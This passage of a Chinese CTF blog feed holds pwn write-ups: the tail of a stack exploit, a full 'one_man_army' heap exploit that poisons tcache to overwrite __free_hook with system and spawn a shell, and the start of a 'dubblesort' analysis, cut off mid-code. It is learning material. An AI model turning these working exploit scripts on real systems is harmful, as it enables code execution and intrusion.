class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;* &#x27;</span>)</span><br><span class=\"line\">    b = p.recvuntil(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    b = b[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">    b = <span class=\"built_in\">int</span>(b, <span class=\"number\">10</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Answer:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a * b))</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;How many levels?\\n&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;-1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Any more?\\n&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Let&#x27;s go!&#x27;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">99</span>):</span><br><span class=\"line\">\tplay()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Answer:&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x38</span> + p64(vsys_addr) * <span class=\"number\">3</span>  </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["STACK - Other"]},{"title":"攻防世界 - one_man_army","url":"/2022/04/12/week7-2.1md/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-kBakpiER\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-12%20%E4%B8%8A%E5%8D%8810.05.02.png\" alt=\"截屏2022-04-12 上午10.05.02\"></p>\n<p>libc是2.27。</p>\n<h1><span id=\"逆向\">逆向</span></h1><p>增删查改。</p>\n<h2><span id=\"add\">add</span></h2><p>没有什么特别的地方，纯纯的指针操作。没有结构体，没有保存指针到bss上。但是会对输入的size取低九位，虽然可以输入15位的size，但是生效的只有九位。所以只能add出 一个chunk。有点lonely wolf的味道。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\"> read(<span class=\"number\">0</span>, size_4, <span class=\"number\">0xF</span>uLL);</span><br><span class=\"line\"> size_2 = atoi(size_4);</span><br><span class=\"line\"> size = size_2 &amp; <span class=\"number\">0x1FF</span>;</span><br><span class=\"line\"> ptr = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(size_2 &amp; <span class=\"number\">0x1FF</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\"> read(<span class=\"number\">0</span>, ptr, size);</span><br><span class=\"line\"> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done!&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h2><span id=\"show\">show</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">show</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(ptr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>…不好评价。</p>\n<h2><span id=\"free\">free</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">free_0</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  ptr = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如何评价。</p>\n<h2><span id=\"edit\">edit</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v4 == <span class=\"number\">0x2333</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !dword_4050 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          read(<span class=\"number\">0</span>, ptr, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<p>就是个edit，挺无聊的。但是可以覆盖top chunk，也许是一道house of force。</p>\n<h1><span id=\"利用\">利用</span></h1><h3><span id=\"构造unsorted-bin-leak\">构造unsorted bin leak</span></h3><p>​        保护全开，只能改hook，考虑到free没有uaf，并且没有可以劫持的指针。edit可以溢出到top chunk。</p>\n<p>​        目前来看可以利用的点只有这里。top chunk溢出的利用我只做过house of force和house of orange，显然这里不需要house of orange，但是也不是不能用。house of force首先得申请任意size chunk，这边明显对size做了限制，虽然也能申请到比较大的chunk，但是还是达不到force的条件。</p>\n<p>​        house of orange倒是可行，但是不清楚后续利用的可行性，可以先试一试。        </p>\n<p>​        哄堂大笑了，house of orange也不行，size最大为511，小于进行页对齐的top chunk size的720（就算这种极限情况可以达到也没什么意义吧）</p>\n<p>​        好的，唯一会的两种情况都不行，还是得回过头看tcache double free。</p>\n<p>​        目前发现的一个可以利用的点就是，利用堆溢出修改下一个chunk的size，伪造large chunk实现leak。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">free()<span class=\"comment\">#tcacha bin 0x30</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">free()<span class=\"comment\">#tcache bin 0x90</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">edit(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x401</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n<p>​            这段exp是可以修改size为0x401的，不过我怎么也想不通，</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-12%20%E4%B8%8B%E5%8D%885.23.19.png\" alt=\"截屏2022-04-12 下午5.23.19\"></p>\n<p>​        为什么会有0x400的tcache，不是应该直接放到unsorted bin里吗？于是我爬了，我去看wp了。</p>\n<p>​        看完了，虽然没有发现为什么会有0x410的tcache，但是按照我这个wp，我只纯粹地把chunk size修改为了0x401，但是无法进行后续的利用。</p>\n<p>​        而这是正常的版本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">0x10</span>):</span><br><span class=\"line\">    add(i * <span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">    free()<span class=\"comment\">#0-9</span></span><br><span class=\"line\"><span class=\"comment\">#将0x100范围内的chunk每个放一个进入tcache。</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>)<span class=\"comment\">#10</span></span><br><span class=\"line\"><span class=\"comment\">#申请，此时会申请到刚才循环中free的0x10的chunk。</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x4b1</span>)<span class=\"comment\">#覆盖下一个chunksize（size为0x20的tcachebin）为0x4b1</span></span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\">free()<span class=\"comment\">#此时被free的指针指向#10，也就是#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;a&quot;</span>)<span class=\"comment\">#申请，ptr指向#1，也就是刚刚覆盖的size为0x4b1的chunk。</span></span><br><span class=\"line\"><span class=\"comment\">#此处有一个问题，就是为什么我申请0x20的chunk，不会把0x4b1覆盖为0x31,这个问题留到源码分析时解决。</span></span><br><span class=\"line\">free()<span class=\"comment\">#free1，也就是free 0x4b1chunk，此时可以在unsorted bin中看到这个bin。但是由于它是一个free chunk，我们没有办法把它show出来，因此需要让新申请的chunk指向它。</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;a&quot;</span>)<span class=\"comment\">#申请，ptr指向#1。这里0x30的空间来源于tcachebin，所以指针会指向#1，但是并不会改变unsorted bin的偏移。</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&quot;a&quot;</span>)<span class=\"comment\">#再次申请0x30的chunk，此时从unsorted bin中分割0x40大小的空间，指针向前偏移0x40，正好指向#2。</span></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = u64(p.recvuntil(<span class=\"string\">&quot;\\n&quot;</span>, drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>] </span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&quot;__free_hook&quot;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br></pre></td></tr></table></figure>\n<p>​        在free了这个unsorted bin后，bin中状态如图：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%889.57.26.png\" alt=\"截屏2022-04-14 下午9.57.26\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%889.57.40.png\" alt=\"截屏2022-04-14 下午9.57.40\"></p>\n<p>​        申请0x20的chunk以后，unsorted bin的first bin指针向后偏移了0x30，也就指向了0x30 free chunk的位置，这说明我们刚刚申请的chunk是通过unsorted bin分割出来的。为什么会是unsorted bin分割而不是tcache分配呢》我不知道。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%889.58.16.png\" alt=\"截屏2022-04-14 下午9.58.16\"></p>\n<p>​        再申请0x30的chunk，此时unsorted bin并没有偏移，还是指向2a0，也就是原本0x30 free chunk，也就是我们刚刚申请的chunk的位置，这样我们unsorted bin指向的chunk就是一个可以show出来的chunk了。</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%8810.02.07.png\" alt=\"截屏2022-04-14 下午10.02.07\"></p>\n<h3><span id=\"改free-hook为system\">改free hook为system</span></h3><p>​        接着的利用比较常规。</p>\n<p>​        在上面的步骤中，我们的申请使得现在指针指向的是0x30的chunk。也是一个unsorted bin。填充0x30的垃圾数据，溢出到下一个0x40的chunk。为了使下一个申请0x40的时候能申请到这一片内存，编辑其size为0x50，然后修改fd为使其指向<code>free_hook</code>。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x50</span>) + p64(free_hook)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#point to free_hook</span></span><br><span class=\"line\">edit(p64(system_addr)) </span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n<p>​                </p>\n<h2><span id=\"问题\">问题</span></h2><h4><span id=\"1\">1</span></h4><p>不知道为什么就突然给我报错，明明没有任何问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-13%20%E4%B8%8A%E5%8D%889.46.32.png\" alt=\"截屏2022-04-13 上午9.46.32\"></p>\n<p>蚌埠住了，把edit的<code>sendline()</code>改成send就没问题了。以后输入字符串的话都不能加line。</p>\n<h4><span id=\"2\">2</span></h4><p>​    在覆盖下一个chunk的size为0x4b1之后，为什么在此在这个地方申请0x20的chunk不会把0x4b1的size字节覆盖？还有为什么是0x4b1？</p>\n<h4><span id=\"3\">3</span></h4><p>​        关于unsorted bin的分配优先级以及指针的一些规则还是不太明白。以及tcache的分配，tcache bin的分配规则都是模糊不清的。</p>\n<h2><span id=\"exp\">exp：</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc-2.27.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./oneman_army&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&quot;111.200.241.244&quot;,57601)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./oneman_army&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;choice:&quot;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&quot;Content:&quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">content</span>):</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;choice: &quot;</span>,<span class=\"string\">&#x27;9011&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;choice: &quot;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>():</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;choice: &quot;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">0x10</span>):</span><br><span class=\"line\">    add(i * <span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">    free()<span class=\"comment\">#0-9</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>)<span class=\"comment\">#10</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x4b1</span>)<span class=\"comment\">#覆盖下一个chunksize（size为0x20的tcachebin）为0x4b1</span></span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\">free()<span class=\"comment\">#此时被free的指针指向#9，也就是#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#指向#1</span></span><br><span class=\"line\">free()<span class=\"comment\">#free1，也就是free 0x4b1chunk，此时可以在unsorted bin中看到这个bin。</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">malloc_hook = u64(p.recvuntil(<span class=\"string\">&quot;\\n&quot;</span>, drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">96</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"comment\">#malloc_hook = 0x7ffff7dcdca0 - 96 - 0x10</span></span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>] </span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&quot;__free_hook&quot;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x50</span>) + p64(free_hook)</span><br><span class=\"line\">edit(payload)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#point to free_hook</span></span><br><span class=\"line\">edit(p64(system_addr)) </span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1><span id=\"参考\">参考</span></h1><p><a href=\"https://blog.csdn.net/qq_33976344/article/details/120083836\">ADworld pwn wp - onemanarmy</a></p>\n","categories":["Binary_security"],"tags":["HEAP - Tcache"]},{"title":"pwnable - doubblesort","url":"/2022/04/24/week8_7.1_dubblesort/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-uGVDdUkz\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%883.08.45.png\" alt=\"截屏2022-04-24 下午3.08.45\"></p>\n<p>​    </p>\n<h1><span id=\"逆向\">逆向</span></h1><p>​    又是排序。但是这个是个纯纯的栈题，并且保护全开，那就是不能rop，估计又是要逆清然后找漏洞捏。照我之前做的那个快排的经验，排序本身应该没有漏洞，漏洞出在num地址的溢出。</p>\n<h3><span id=\"main\">main</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> sort_num; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  _BYTE *num_order; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> j; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num; <span class=\"comment\">// [esp+18h] [ebp-74h] BYREF</span></span><br><span class=\"line\">  _BYTE v9[<span class=\"number\">32</span>]; <span class=\"comment\">// [esp+1Ch] [ebp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">64</span>]; <span class=\"comment\">// [esp+3Ch] [ebp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v11; <span class=\"comment\">// [esp+7Ch] [ebp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v11 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  init();                                       <span class=\"comment\">// init</span></span><br><span class=\"line\">  print(<span class=\"number\">1</span>, <span class=\"string\">&quot;What your name :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x40</span>u);                          <span class=\"comment\">// buf =&gt; 64 byte , NO OVERFLOW</span></span><br><span class=\"line\">  print(<span class=\"number\">1</span>, <span class=\"string\">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;num);                   <span class=\"comment\">// uint</span></span><br><span class=\"line\">  sort_num = num;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    num_order = v9;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; num; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      print(<span class=\"number\">1</span>, <span class=\"string\">&quot;Enter the %d number : &quot;</span>);</span><br><span class=\"line\">      fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">      __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, num_order);</span><br><span class=\"line\">      sort_num = num;</span><br><span class=\"line\">      num_order += <span class=\"number\">4</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sort(v9, sort_num);                           <span class=\"comment\">// sort</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Result :&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; num; ++j )</span><br><span class=\"line\">      print(<span class=\"number\">1</span>, <span class=\"string\">&quot;%u &quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( __readgsdword(<span class=\"number\">0x14</span>u) != v11 )</span><br><span class=\"line\">    sub_BA0();                                  <span class=\"comment\">// smash</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里是比较奇怪的就是程序记录num的次序是在栈上定义的一个指针，然后将对应的num输入到指针指向的地方，所以如果我们能够劫持这个指针或许就找到了突破口。</p>\n<p>​        这里有一个看起来有一些奇怪的逻辑，每一次输入num，num_order 加4，也就是对应两个uint长度，似乎也没有什么用.</p>\n<p>​        但是找不到劫持的方法，sort的步骤看起来合情合理，并没有什么明显的漏洞。</p>\n<h3><span id=\"sort\">sort</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> __cdecl <span class=\"title\">sub_931</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *a1, <span class=\"keyword\">int</span> num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> last_num; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *v6; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+1Ch] [ebp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Processing......&quot;</span>);</span><br><span class=\"line\">  sleep(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    last_num = num - <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = (<span class=\"keyword\">int</span>)&amp;a1[num - <span class=\"number\">1</span>]; ; i -= <span class=\"number\">4</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span 